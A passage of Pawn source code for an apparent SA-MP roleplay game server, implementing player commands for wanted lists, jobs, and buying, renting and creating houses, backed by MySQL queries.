		format(query, sizeof(query), "SELECT * FROM `users` WHERE `Member` = '%d' ORDER BY `Rank` DESC LIMIT 30", PlayerInfo[playerid][pMember]);
		new Cache: membresult = mysql_query(SQL, query);
		for(new i, j = cache_get_row_count (); i != j; ++i)
		{
			cache_get_field_content(i, "name", result); format(test, 300, result);
			test1 = cache_get_field_content_int(i, "Rank");
			idd = cache_get_field_content_int(i, "id");
			Selected[playerid][mid] = idd;
			format(aim, sizeof(aim), "%s%d\t%s\n", aim, test1, test);
			mid++;			
		}
		cache_delete(membresult);
		format(aimtotal, sizeof(aimtotal), "Rank\tName\n%s",aim);
		if(PlayerInfo[playerid][pRank] >= 6)
		{
			ShowPlayerDialog(playerid,DIALOG_MEMBERS,DIALOG_STYLE_TABLIST_HEADERS,"Faction members",aimtotal,"Select","Exit");
		}
	}
	return 1;
}
CMD:wanted(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a cop.");
	new iString[512], sendername[MAX_PLAYER_NAME],count,online[50], string[128];
	if(IsPlayerConnected(playerid))
	{
  		foreach(Player, i)
		{
			if(PlayerInfo[i][pWantedLevel] >= 1)
			{
			    GetPlayerName(i, sendername, sizeof(sendername));
				string[0] = 0;
   				Selectat[count][playerid] = i;
   				if(PlayerInfo[i][pSleeping] > 0)
				{
					format(string, sizeof(string), "[W:%d] [%d] [%d] %s (AFK)\n",PlayerInfo[i][pWantedLevel],wantedlost[i]/60,cased[i],sendername);
					count++;
				}
				else if(PlayerInfo[i][pSleeping] == 0)
  				{
					format(string, sizeof(string), "[W:%d] [%d] [%d] %s\n",PlayerInfo[i][pWantedLevel],wantedlost[i]/60,cased[i],sendername);
					count++;
				}
				strcat(iString, string);
			}
		}
		format(online, sizeof(online),"Wanted online: %d",count);
		if(count == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}No wanted online at the moment.");
		ShowPlayerDialog(playerid, DIALOG_WANTEDON, DIALOG_STYLE_LIST, online, iString , "Select", "Close");
	}
	return 1;
}
CMD:nearwanted(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a cop.");
	new iString[512],string[300],sendername[MAX_PLAYER_NAME],count = 0,online[50];
	if(IsPlayerConnected(playerid))
	{
		foreach(Player, i)
		{
			if(PlayerInfo[i][pWantedLevel] >= 1 && ProxDetectorS(200.0, playerid,i))
			{
				GetPlayerName(i, sendername, sizeof(sendername));
				string[0] = 0;
   				Selectat[count][playerid] = i;
   				if(PlayerInfo[i][pSleeping] > 0)
				{
					format(string, sizeof(string), "[W:%d] [%d] [%d] %s (AFK)\n",PlayerInfo[i][pWantedLevel],wantedlost[i]/60,cased[i],sendername);
					count++;
				}
				else if(PlayerInfo[i][pSleeping] == 0)
  				{
					format(string, sizeof(string), "[W:%d] [%d] [%d] %s\n",PlayerInfo[i][pWantedLevel],wantedlost[i]/60,cased[i],sendername);
					count++;
				}
				strcat(iString, string);
			}
		}
	}
	format(online, sizeof(online),"Wanted online: %d",count);
	if(count == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}No wanted neat you at the moment.");
	ShowPlayerDialog(playerid, DIALOG_WANTEDON, DIALOG_STYLE_LIST, online, iString , "Select", "Close");
	return 1;
}
CMD:mechanics(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new iString[512],string[200],sendername[MAX_PLAYER_NAME],count = 0,online[50];
	if(IsPlayerConnected(playerid))
	{
		foreach(Player,i)
		{
			if(PlayerInfo[i][pJob] == 8)
			{
				GetPlayerName(i, sendername, sizeof(sendername));
				string[0] = 0;
				if(PlayerInfo[i][pSleeping] == 1)
				{
					if(PlayerInfo[i][pJob] == 8) format(string, sizeof(string), "Mechanic - %s(%d) - (AFK)\n",sendername,i);
					count++;
				}
				else if(PlayerInfo[i][pSleeping] == 0)
  				{
					if(PlayerInfo[i][pJob] == 8) format(string, sizeof(string), "Mechanic - %s(%d)\n",sendername,i);
					count++;
				}
				strcat(iString,string);
				format(online, sizeof(online),"Mechanics online: %d",count);
			}
		}
		if(count == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}Mechanics not online at the moment.");
		ShowPlayerDialog(playerid, DIALOG_MECHANICS, DIALOG_STYLE_LIST, online, iString , "Close", "");
	}
	return 1;
}
CMD:instructors(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new iString[512],string[200],sendername[MAX_PLAYER_NAME],count = 0,online[50];
	if(IsPlayerConnected(playerid))
	{
		foreach(Player,i)
		{
			if(PlayerInfo[i][pMember] == 12)
			{
				GetPlayerName(i, sendername, sizeof(sendername));
				string[0] = 0;
				if(PlayerInfo[i][pSleeping] == 1)
				{
					if(PlayerInfo[i][pMember] == 12) format(string, sizeof(string), "Instructor - %s(%d) - (AFK) - %d\n",sendername,i,PlayerInfo[i][pPnumber]);
					count++;
				}
				else if(PlayerInfo[i][pSleeping] == 0)
  				{
					if(PlayerInfo[i][pMember] == 12) format(string, sizeof(string), "Instructor - %s(%d) - %d\n",sendername,i,PlayerInfo[i][pPnumber]);
					count++;
				}
				strcat(iString,string);
				format(online, sizeof(online),"Instructors online: %d",count);
			}
		}
		if(count == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}Instructors not online at the moment.");
		ShowPlayerDialog(playerid, DIALOG_INSTRUCTORS, DIALOG_STYLE_LIST, online, iString , "Close", "");
		SCM(playerid,COLOR_SERVER,"Use /requestlicense for take a license.");
	}
	return 1;
}

CMD:collect(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if(CP[playerid] > 0 ||IsATruck(GetPlayerVehicleID(playerid)) || MechanicCallTime[playerid] > 0 && CarJacker[playerid] < 1)
		{
		    ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "No");
		    return 1;
		}
  		if(PlayerInfo[playerid][pJob] != 10) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a garbage man.");
		new tmpcar = GetPlayerVehicleID(playerid);
		if(IsAGarbageTruck(tmpcar))
  		{
    		if(PlayerInfo[playerid][pGarbageTime] == 0)
   			{
      			if(IsCollectingRubbish[playerid] == 0)
         		{
         		    DisablePlayerCheckpoint(playerid);
          			SendClientMessage(playerid, COLOR_LIGHTBLUE, "INFO: Head to all the check points, then return to the depot for a pay check.");
	           		SetPlayerCheckpoint(playerid, 2255.5676,2520.5898,10.8203, 5.0);
             		IsCollectingRubbish[playerid] = 1;
					PlayerInfo[playerid][pGarbageTime] += 1;
					new str2[128];
					format(str2,sizeof(str2),"~y~Gunoi colectat: ~r~0~y~/~r~10");
					PlayerTextDrawSetString(playerid, gunoierr[playerid], str2);
					PlayerTextDrawShow(playerid, gunoierr[playerid]);
					return 1;
     			}
        		else
          		{
            		SendClientMessage(playerid, COLOR_SERVER, "{C1F589}You are already collecting rubbish.");
            		return 1;
          		}
			}
			else
			{
   				SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Wait until the next garbage run is available.");
			    return 1;
			}
   		}
   		else
     	{
      		SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in a Garbage Truck.");
        	return 1;
      	}
  	}
   	return 1;
}
CMD:jobduty(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if(PlayerInfo[playerid][pJob] == 8)
		{
			if(JobDuty[playerid] == 1)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You are now Off Duty from your Car Mechanic Job and will not receive calls anymore.");
			    JobDuty[playerid] = 0;
			    Mechanics -= 1;
			}
		    else
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You are now On Duty with your Car Mechanic Job and will receive calls from people in need.");
			    JobDuty[playerid] = 1;
			    Mechanics += 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "{ba9789}You do not have a job.");
			return 1;
		}
	}
	return 1;
}
CMD:buyhouse(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		new Float:oldposx, Float:oldposy, Float:oldposz,string[100],playername[MAX_PLAYER_NAME],stringcasa[128];
		GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		for(new h = 1; h < sizeof(HouseInfo); h++)
		{
			if(PlayerToPoint(2.0, playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]) && HouseInfo[h][hOwned] == 0)
			{
				if(PlayerInfo[playerid][pLevel] < HouseInfo[h][hLevel])
				{
					format(string, sizeof(string), "You must be Level %d to purchase this.", HouseInfo[h][hLevel]);
					SendClientMessage(playerid, COLOR_SERVER, string);
					return 1;
				}
				if(PlayerInfo[playerid][pVip] < 1)
				{
					if(PlayerInfo[playerid][pPhousekey] != 999) return SendClientMessage(playerid, COLOR_ERROR, "Your account is Standard, you own two houses only if you own VIP.");
				}
				else
				{
					if(PlayerInfo[playerid][pPhousekey] != 999 && PlayerInfo[playerid][pPhousekey2] != 999) return SCM(playerid, COLOR_ERROR, "Ai deja 2 case.");
				}
				if(GetPlayerCash(playerid) >= HouseInfo[h][hValue])
				{
                    InHouse[playerid] = h;
					if(PlayerInfo[playerid][pPhousekey] == 999)
					{
						PlayerInfo[playerid][pPhousekey] = h;
						Update(playerid,pPhousekeyx);
					}
					else
					{
						if(PlayerInfo[playerid][pVip] > 0)
						{
							PlayerInfo[playerid][pPhousekey2] = h;
							Update(playerid,pPhousekey2x);
						}
					}
     				PlayerInfo[playerid][pRented] = -1;
					HouseInfo[h][hOwned] = 1;
					strmid(HouseInfo[h][hOwner], PlayerInfo[playerid][pNormalName], 0, 25, 255);
					GivePlayerCash(playerid,-HouseInfo[h][hValue]);
					SetPlayerInterior(playerid,HouseInfo[h][hInterior]);
					SetPlayerPosEx(playerid,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz]);
					SetPlayerVirtualWorld(playerid,HouseInfo[h][hVirtual]);
					GameTextForPlayer(playerid, "~w~Welcome Home~n~You can exit at any time by moving to this door and press enter", 5000, 3);
					PlayerInfo[playerid][pInt] = HouseInfo[h][hInterior];
					PlayerInfo[playerid][pLocal] = h;
					SendClientMessage(playerid, COLOR_SERVER, "Congratulations, on your new Purchase !");
 					SendClientMessage(playerid, COLOR_SERVER, "Type /help to review the new property help section !");
 					format(stringcasa, sizeof(stringcasa), "%s [user:%d] He bought the house [house:%d] of State $%s.",playername,PlayerInfo[playerid][pSQLID],h,FormatNumber(HouseInfo[h][hValue]));
                    ABroadCast(COLOR_YELLOW, stringcasa,1);
                    new var100[256],y,m,d,ho,mi,s,string2[256],string3[256];
					getdate(y,m,d);
					gettime(ho,mi,s);
					format(string2,sizeof(string2),"[%02d-%02d-%d %02d:%02d:%02d] %s",d,m,y,ho,mi,s,stringcasa);
					mysql_real_escape_string(string2, string3);
 					mysql_format(SQL, var100, sizeof(var100), "INSERT INTO playerlogs (`playerid`,`giverid`,`action`,`time`) VALUES ('%d','0','%s','%02d-%02d-%d %02d:%02d:%02d')", PlayerInfo[playerid][pSQLID],string3,d,m,y,ho,mi,s);
					mysql_tquery(SQL,var100,"","");
					Update(playerid,pCashx);
					new str2[256];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `houses` SET `Owned`='1',`Owner`='%s' WHERE `ID`='%d'",PlayerInfo[playerid][pNormalName],HouseInfo[h][hID]);
					mysql_tquery(SQL,str2,"","");
					OnPropTextdrawUpdate(1,h);
					if(strlen(housestring[InHouse[playerid]]) > 0)
					{
					    StopAudioStreamForPlayer(playerid);
						PlayAudioStreamForPlayer(playerid, housestring[InHouse[playerid]]);
					}
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have the cash for that.");
					return 1;
				}
			}
		}
	}
	return 1;
}
CMD:renters(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new idcasa;
		if(sscanf(params, "i", idcasa)) return SCM(playerid, -1, "/renters [1 - house / 2 - vip house]");
		if(idcasa == 1)
		{
			if(PlayerInfo[playerid][pPhousekey] == 999) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have house or you don't have rentroom.");
			new count = 0,playername[MAX_PLAYER_NAME],giveplayer[MAX_PLAYER_NAME],string[200];
			GetPlayerName(playerid, playername, sizeof(playername));
			new h = PlayerInfo[playerid][pPhousekey];
			if(PlayerInfo[playerid][pPhousekey] == h)
			{
				foreach(Player,i)
				{
					if(PlayerInfo[i][pRented] == h)
					{
						GetPlayerName(i,giveplayer,sizeof(giveplayer));
						format(string,sizeof(string),"{FFCC99}* Player %s(%d).",giveplayer,i);
						SendClientMessage(playerid, COLOR_SERVER, string);
						count++;
					}
				}
				if(count == 0)
				{
					SendClientMessage(playerid,COLOR_SERVER,"* No renters online.");
				}
				else if(count >= 1)
				{
					format(string, 256, "* There are %d renters online.", count);
					SCM(playerid, COLOR_SERVER, string);
				}
			}
		}
		if(idcasa == 2)
		{
			if(PlayerInfo[playerid][pPhousekey2] == 999) return SCM(playerid,COLOR_ERROR,"You do not own a house VIP.");
			new count = 0,playername[MAX_PLAYER_NAME],giveplayer[MAX_PLAYER_NAME],string[200];
			GetPlayerName(playerid, playername, sizeof(playername));
			new h = PlayerInfo[playerid][pPhousekey2];
			if(PlayerInfo[playerid][pPhousekey2] == h)
			{
				foreach(Player,i)
				{
					if(PlayerInfo[i][pRented] == h)
					{
						GetPlayerName(i,giveplayer,sizeof(giveplayer));
						format(string,sizeof(string),"{FFCC99}* Player %s(%d).",giveplayer,i);
						SendClientMessage(playerid, COLOR_SERVER, string);
						count++;
					}
				}
				if(count == 0)
				{
					SendClientMessage(playerid,COLOR_SERVER,"* No renters online.");
				}
				else if(count >= 1)
				{
					format(string, 256, "* There are %d renters online.", count);
					SCM(playerid, COLOR_SERVER, string);
				}
			}
		}		
	}
	return 1;
}
CMD:rentroom(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new Float:oldposx, Float:oldposy, Float:oldposz,playername[MAX_PLAYER_NAME];
		GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		for(new h = 1; h < sizeof(HouseInfo); h++)
		{
			if(IsPlayerInRangeOfPoint(playerid,2.0, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]) && HouseInfo[h][hOwned] == 1 &&  HouseInfo[h][hRentabil] == 1)
			{
				if(PlayerInfo[playerid][pPhousekey] != 999 || PlayerInfo[playerid][pPhousekey2] != 999) return SendClientMessage(playerid, COLOR_SERVER, "You already own a house.");
				if(GetPlayerCash(playerid) > HouseInfo[h][hRent])
				{
					PlayerInfo[playerid][pRented] = h;
					InHouse[playerid] = h;
	    			GivePlayerCash(playerid,-HouseInfo[h][hRent]);
					HouseInfo[h][hTakings] = HouseInfo[h][hTakings]+HouseInfo[h][hRent];
					SetPlayerInterior(playerid,HouseInfo[h][hInterior]);
					SetPlayerPosEx(playerid,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz]);
					SetPlayerVirtualWorld(playerid,HouseInfo[h][hVirtual]);
					GameTextForPlayer(playerid, "~w~Welcome Home~n~You can exit at any time by moving to this door and press enter", 5000, 3);
					PlayerInfo[playerid][pInt] = HouseInfo[h][hInterior];
					PlayerInfo[playerid][pLocal] = h;
					SendClientMessage(playerid, COLOR_SERVER, "Congratulations, You can enter and exit here anytime.");
					SendClientMessage(playerid, COLOR_SERVER, "Type /help to review the new property help section.");
					Update(playerid,pCashx);
					new str[128];
					mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Rented`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pRented],PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str,"","");
					if(strlen(housestring[InHouse[playerid]]) > 0)
					{
					    StopAudioStreamForPlayer(playerid);
						PlayAudioStreamForPlayer(playerid, housestring[InHouse[playerid]]);
					}
				 	return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have the cash for that.");
					return 1;
				}
			}
		}
	}
	return 1;
}
CMD:housename(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new idcasa,housename[256];
		if(sscanf(params, "is[250]", idcasa,housename)) return SCM(playerid, -1, "/housename [1 - house / 2 - vip house] <Message>");
		if(idcasa == 1)
		{
			new bouse = PlayerInfo[playerid][pPhousekey],string[100];
			if (PlayerInfo[playerid][pPhousekey] != 999)
			{
				new maxc = strlen(housename);
				if(maxc > 20) return SCM(playerid,COLOR_SERVER,"{FFB870}Maximum caracter is 20.");
				new housename2[250];
				mysql_real_escape_string(housename, housename2);
				strmid(HouseInfo[bouse][hDiscription], housename2, 0, 64, 255);
				format(string, sizeof(string), "House name set to:{B8DBFF} %s",HouseInfo[bouse][hDiscription]);
				SendClientMessage(playerid, COLOR_SERVER, string);
				new str[256];
				mysql_format(SQL,str,sizeof(str),"UPDATE houses SET Discription='%s' WHERE ID='%d'",HouseInfo[bouse][hDiscription],PlayerInfo[playerid][pPhousekey]);
				mysql_tquery(SQL,str,"","");
				OnPropTextdrawUpdate(1, bouse);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't own a house.");
		}
		if(idcasa == 2)
		{
			new bouse = PlayerInfo[playerid][pPhousekey2],string[100];
			if (PlayerInfo[playerid][pPhousekey2] != 999)
			{
				new maxc = strlen(housename);
				if(maxc > 20) return SCM(playerid,COLOR_SERVER,"{FFB870}Maximum caracter is 20.");
				new housename2[250];
				mysql_real_escape_string(housename, housename2);
				strmid(HouseInfo[bouse][hDiscription], housename2, 0, 64, 255);
				format(string, sizeof(string), "House name set to:{B8DBFF} %s",HouseInfo[bouse][hDiscription]);
				SendClientMessage(playerid, COLOR_SERVER, string);
				new str[256];
				mysql_format(SQL,str,sizeof(str),"UPDATE houses SET Discription='%s' WHERE ID='%d'",HouseInfo[bouse][hDiscription],PlayerInfo[playerid][pPhousekey2]);
				mysql_tquery(SQL,str,"","");
				OnPropTextdrawUpdate(1, bouse);
			}
			else return SendClientMessage(playerid, COLOR_ERROR, "Nu ai o casa VIP.");
		}		
	}
	return 1;
}
CMD:asellbiz(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new house;
		if(sscanf(params, "d", house)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/asellbiz <Biz ID>");
		if (PlayerInfo[playerid][pAdmin] >= 7 && EstiFondator(playerid))
		{
			new
				str2[512];
			BizzInfo[house][bLocked] = 0;
			BizzInfo[house][bOwned] = 0;
			strmid(BizzInfo[house][bOwner], "The State", 0, strlen("The State"), 255);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			GameTextForPlayer(playerid, "~w~You have sold this property", 10000, 3);
			mysql_format(SQL,str2,sizeof(str2),"UPDATE `bizz` SET `Locked`='0',`Owned`='0',`Owner`='The State' WHERE `ID`='%d'",house);
			mysql_tquery(SQL,str2,"","");
    		mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `Bizz`='255' WHERE `Bizz`='%d'",house);
			mysql_tquery(SQL,str2,"","");
			OnPropTextdrawUpdate(2, house);
			return 1;
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{5CAD5C}Error: Your admin level isn't high enough to use this command.");
	}
	return 1;
}
CMD:asellhouse(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new house;
		if(sscanf(params, "d", house)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/asellhouse <House ID>");
		if (PlayerInfo[playerid][pAdmin] >= 7 && EstiFondator(playerid))
		{
			new 
				str2[512];
			HouseInfo[house][hHel] = 0;
			HouseInfo[house][hArm] = 0;
			HouseInfo[house][hLock] = 0;
			HouseInfo[house][hOwned] = 0;
			strmid(HouseInfo[house][hOwner], "The State", 0, strlen("The State"), 255);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			mysql_format(SQL,str2,sizeof(str2),"UPDATE `houses` SET `Hel`='0',`Arm`='0',`Lockk`='0',`Owned`='0',`Owner`='The State' WHERE `ID`='%d'",house);
			mysql_tquery(SQL,str2,"","");
    		mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `House`='999' WHERE `House`='%d'",house);
			mysql_tquery(SQL,str2,"","");
			mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `House2`='999' WHERE `House2`='%d'",house);
			mysql_tquery(SQL,str2,"","");
			OnPropTextdrawUpdate(1, house);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "{5CAD5C}Error: Your admin level isn't high enough to use this command.");
		}
	}
	return 1;
}
CMD:starttimerlast1min(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
		SendClientMessageToAll(COLOR_SERVER, "It was started the countdown server");
		last1Min = 60;
	}
	return 1;
}
CMD:createhouse(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "Please login server!");
    if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pAdmin] >= 6)
		{
			new house[64],Float:pX,Float:pY,Float:pZ,PropertyString[1000],query[500];
			if(sscanf(params, "s[64]", house)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/createhouse [interios</small/medium/big>]");
		    if(strcmp(house,"medium",true) == 0)
			{
			    GetPlayerPos(playerid, pX, pY, pZ);
				SetPVarFloat(playerid, "pHeX", pX);
	        	SetPVarFloat(playerid, "pHeY", pY);
	        	SetPVarFloat(playerid, "pHeZ", pZ);
				SetPVarInt(playerid, "hExt", 1);
				SetPVarFloat(playerid, "pHiX", 243.4247);
	            SetPVarFloat(playerid, "pHiY",  -1851.5872);
	            SetPVarFloat(playerid, "pHiZ", 3333.9329);
	            SetPVarInt(playerid, "pHiID", 0);
	            new i = housess+1;
				mysql_format(SQL, query, sizeof(query), "INSERT INTO houses (Owner, Lockk, Hel, Arm, Level, Rentabil, Rent, Owned, Discription, Value, Takings) VALUES('The State', '0', '0', '0', '10', '1', '500', '0', 'House', '10000000', '0')");
				mysql_tquery(SQL, query, "", "");

				HouseInfo[i][hID]                           = i;
   	    		HouseInfo[i][hEntrancex]                    = GetPVarFloat(playerid, "pHeX");
				HouseInfo[i][hEntrancey]                    = GetPVarFloat(playerid, "pHeY");
			 	HouseInfo[i][hEntrancez]                    = GetPVarFloat(playerid, "pHeZ");
        		HouseInfo[i][hExitx]                        = GetPVarFloat(playerid, "pHiX");
        		HouseInfo[i][hExity]                        = GetPVarFloat(playerid, "pHiY");
        		HouseInfo[i][hExitz]                        = GetPVarFloat(playerid, "pHiZ");
        		format(HouseInfo[i][hOwner], 64, "The State");
        		format(HouseInfo[i][hDiscription], 64, "House");
        		HouseInfo[i][hValue]						= 10000000;
        		SetPVarInt(playerid, "pHiVW", housess+HouseInfo[i][hValue]);
        		HouseInfo[i][hHel]                          = 0;
 			 	HouseInfo[i][hArm]                          = 0;
        		HouseInfo[i][hInterior]                     = GetPVarInt(playerid, "pHiID");
        		HouseInfo[i][hLock]                         = 0;
        		HouseInfo[i][hOwned]                        = 0;
        		HouseInfo[i][hRent]                         = 500;
        		HouseInfo[i][hRentabil]                     = 1;
        		HouseInfo[i][hTakings]                      = 0;
        		HouseInfo[i][hLevel]                        = 5;
        		HouseInfo[i][hVirtual]                      = GetPVarInt(playerid, "pHiVW");

        		mysql_format(SQL, query, sizeof(query), "UPDATE `houses` SET `Entrancex`='%f',`Entrancey`='%f',`Entrancez`='%f',`Exitx`='%f',`Exity`='%f',`Exitz`='%f',`Interior`='%d',`Virtual`='%d' WHERE `ID`='%d'",HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey],HouseInfo[i][hEntrancez],HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz],HouseInfo[i][hInterior],HouseInfo[i][hVirtual],i);
        		mysql_tquery(SQL,query,"","");

        		DeletePVar(playerid, "pHeX");
			    DeletePVar(playerid, "pHeY");
			    DeletePVar(playerid, "pHeZ");
			    DeletePVar(playerid, "pHiX");
			    DeletePVar(playerid, "pHeY");
			    DeletePVar(playerid, "pHeZ");
			    DeletePVar(playerid, "pHiID");
			    DeletePVar(playerid, "pHiVW");
			    DeletePVar(playerid, "pExt");
			    DeletePVar(playerid, "pInt");

        		DestroyDynamic3DTextLabel(HouseLabel[i]);
				format(PropertyString, sizeof(PropertyString),"{FFFFFF}House {A9C4E4}%d \n{A9C4E4}This house is for sale(/buyhouse) ! \n{FFFFFF}Description: {A9C4E4}%s \n{FFFFFF}Price: {A9C4E4}$%s \n{FFFFFF}Level: {A9C4E4}%d",i,HouseInfo[i][hDiscription],FormatNumber(HouseInfo[i][hValue]),HouseInfo[i][hLevel]);
				HouseLabel[i] = CreateDynamic3DTextLabel(PropertyString ,0x09FF00CC,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez],25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);

				SetPlayerInterior(playerid, 0);
				SetPlayerVirtualWorld(playerid, 0);
				SetPlayerPos(playerid, HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]);
				housess++;
				SendClientMessage(playerid, COLOR_YELLOW, "House added interior: medium.");
			}
			if(strcmp(house,"small",true) == 0)
			{
			    GetPlayerPos(playerid, pX, pY, pZ);
				SetPVarFloat(playerid, "pHeX", pX);
	        	SetPVarFloat(playerid, "pHeY", pY);
	        	SetPVarFloat(playerid, "pHeZ", pZ);
				SetPVarFloat(playerid, "pHiX", 210.6192);
            	SetPVarFloat(playerid, "pHiY",  1753.7064);
            	SetPVarFloat(playerid, "pHiZ", 3334.2429);
            	SetPVarInt(playerid, "pHiID", 0);
            	new i = housess+1;
				mysql_format(SQL, query, sizeof(query), "INSERT INTO houses (Owner, Lockk, Hel, Arm, Level, Rentabil, Rent, Owned, Discription, Value, Takings) VALUES('The State', '0', '0', '0', '10', '1', '500', '0', 'House', '10000000', '0')");
				mysql_tquery(SQL, query, "", "");

				HouseInfo[i][hID]                           = i;
   	    		HouseInfo[i][hEntrancex]                    = GetPVarFloat(playerid, "pHeX");
				HouseInfo[i][hEntrancey]                    = GetPVarFloat(playerid, "pHeY");
			 	HouseInfo[i][hEntrancez]                    = GetPVarFloat(playerid, "pHeZ");
        		HouseInfo[i][hExitx]                        = GetPVarFloat(playerid, "pHiX");
        		HouseInfo[i][hExity]                        = GetPVarFloat(playerid, "pHiY");
        		HouseInfo[i][hExitz]                        = GetPVarFloat(playerid, "pHiZ");
        		format(HouseInfo[i][hOwner], 64, "The State");
        		format(HouseInfo[i][hDiscription], 64, "House");
        		HouseInfo[i][hValue]						= 5000000;
        		SetPVarInt(playerid, "pHiVW", housess+HouseInfo[i][hValue]);
        		HouseInfo[i][hHel]                          = 0;
 			 	HouseInfo[i][hArm]                          = 0;
        		HouseInfo[i][hInterior]                     = GetPVarInt(playerid, "pHiID");
        		HouseInfo[i][hLock]                         = 0;
        		HouseInfo[i][hOwned]                        = 0;
        		HouseInfo[i][hRent]                         = 500;
        		HouseInfo[i][hRentabil]                     = 1;
        		HouseInfo[i][hTakings]                      = 0;
        		HouseInfo[i][hLevel]                        = 3;
        		HouseInfo[i][hVirtual]                      = GetPVarInt(playerid, "pHiVW");

        		mysql_format(SQL, query, sizeof(query), "UPDATE `houses` SET `Entrancex`='%f',`Entrancey`='%f',`Entrancez`='%f',`Exitx`='%f',`Exity`='%f',`Exitz`='%f',`Interior`='%d',`Virtual`='%d' WHERE `ID`='%d'",HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey],HouseInfo[i][hEntrancez],HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz],HouseInfo[i][hInterior],HouseInfo[i][hVirtual],i);
        		mysql_tquery(SQL,query,"","");

        		DeletePVar(playerid, "pHeX");
			    DeletePVar(playerid, "pHeY");
			    DeletePVar(playerid, "pHeZ");
			    DeletePVar(playerid, "pHiX");
			    DeletePVar(playerid, "pHeY");
			    DeletePVar(playerid, "pHeZ");
			    DeletePVar(playerid, "pHiID");
			    DeletePVar(playerid, "pHiVW");
			    DeletePVar(playerid, "pExt");
			    DeletePVar(playerid, "pInt");

        		DestroyDynamic3DTextLabel(HouseLabel[i]);
